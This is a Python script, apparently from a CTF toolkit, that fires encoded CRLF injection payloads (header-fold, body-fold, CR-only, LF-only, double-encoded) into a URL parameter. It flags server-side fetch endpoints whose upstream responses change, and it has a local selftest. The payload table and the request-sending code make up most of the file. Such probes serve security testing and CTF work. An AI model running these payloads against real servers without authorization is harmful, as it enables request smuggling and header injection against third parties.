#!/usr/bin/env python3
"""crlf_probe.py — folded-character matrix for web-request-smuggling.

The class's confirmed CTF shape is CRLF injection into a server-side
fetch: a request value is interpolated into an upstream URL or header,
and %0d%0a survives into the outbound request. Detection is a
differential — one folded control character versus an ordinary value —
and the signal is the UPSTREAM response changing (status, error text,
or the folded marker surfacing), not anything about your own request.
This fires baseline + folded variants (%0d%0a-header, %0d%0a%0d%0a-body,
%0d-alone, %0a-alone, %250d double-encoded) and grades each against the
baseline: upstream-error / marker-echo / status-delta, verbatim excerpts
attached — a CANDIDATE that still needs the class's confirm probe.

    python3 tools/web/crlf_probe.py --url 'http://h/fetch?u=http://x{M}' 
    python3 tools/web/crlf_probe.py --url URL --param u
    python3 tools/web/crlf_probe.py --selftest
"""
from __future__ import annotations

import argparse
import re
import sys
import urllib.parse

import httpkit

_MARK = "bmk7x"
_FOLDS = {
    "fold-header": f"%0d%0aX-BMK:%20{_MARK}",
    "fold-body":   f"%0d%0a%0d%0a{_MARK}",
    "cr-only":     f"%0dX-BMK:%20{_MARK}",
    "lf-only":     f"%0aX-BMK:%20{_MARK}",
    "double-enc":  f"%250d%250aX-BMK:%20{_MARK}",
}
_UP_ERR = re.compile(r"(?:upstream|backend|proxy|socket|ECONN|refused|"
                     r"invalid (?:header|request)|Bad Request|parse error|"
                     r"malformed)", re.I)


def _fire(args, value, encoded):
    url = args["url"]
    if args.get("param"):
        # urlencode will encode exactly once, so hand it the decoded value —
        # the %0d fold arrives as a literal CRLF after the server decodes
        v = urllib.parse.unquote(value) if encoded else value
        q = urllib.parse.urlparse(url)
        pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
        pairs = [(k, v if k == args["param"] else val) for k, val in pairs]
        if args["param"] not in [k for k, _ in pairs]:
            pairs.append((args["param"], v))
        url = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(pairs)))
    else:
        v = urllib.parse.quote(value, safe="%") if encoded else value
        url = url.replace("{M}", v)
    return httpkit.request(url, headers=args.get("headers"),
                           timeout=args.get("timeout", 15))


def _text(r):
    b = r.get("body", "")
    return b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")


def probe(args) -> dict:
    base = _fire(args, args.get("value", "https://example.com/"), encoded=False)
    bsig = httpkit.body_signature(_text(base)) if _text(base) else None
    out = {"url": args["url"], "param": args.get("param"),
           "baseline": {"status": base.get("status"), "len": len(_text(base))},
           "cases": []}
    cand = []
    for name, fold in _FOLDS.items():
        r = _fire(args, fold, encoded=True)
        body = _text(r)
        s = {"status": r.get("status"), "len": len(body),
             "sig": httpkit.body_signature(body) if body else None}
        rec = {"fold": name, "payload": fold, **s}
        reasons = []
        i = body.find(_MARK)
        if i >= 0:
            rec["excerpt"] = body[max(0, i - 40):i + len(_MARK) + 40]
            reasons.append("marker-echo")
        m = _UP_ERR.search(body)
        if m and not _UP_ERR.search(_text(base)):
            rec["up_error"] = m.group(0)
            reasons.append("upstream-error")
        if s["status"] != base.get("status"):
            reasons.append("status-delta")
        if reasons:
            rec["reasons"] = reasons
            cand.append(rec)
        out["cases"].append(rec)
    out["crlf_candidates"] = cand
    out["candidate_only"] = True
    if not cand:
        out["note"] = ("no fold variant changed the upstream response — "
                       "the value was probably encoded or validated; "
                       "record the falsifier as observed")
    return out


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Fetch(BaseHTTPRequestHandler):
        def do_GET(self):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            u = q.get("u", [""])[0]
            # simulate: decoded CRLF reaching the upstream request breaks it
            if "\r\n" in u or "\r" in u or "\n" in u:
                self.send_response(502)
                body = b"upstream parse error: invalid header"
            else:
                self.send_response(200)
                body = b"fetched ok"
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Fetch)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/fetch?u=http://x"
    out = probe({"url": url, "param": "u", "headers": {},
                 "value": "http://x", "timeout": 15})
    srv.shutdown()
    kinds = {r for c in out["crlf_candidates"] for r in c["reasons"]}
    assert "upstream-error" in kinds, out
    print("crlf_probe selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", help="URL with {M} marking the value slot, or --param")
    ap.add_argument("--param")
    ap.add_argument("--value", help="ordinary baseline value")
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not (args.param or "{M}" in args.url):
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    httpkit.jprint(probe(a))
    return 0


if __name__ == "__main__":
    sys.exit(main())
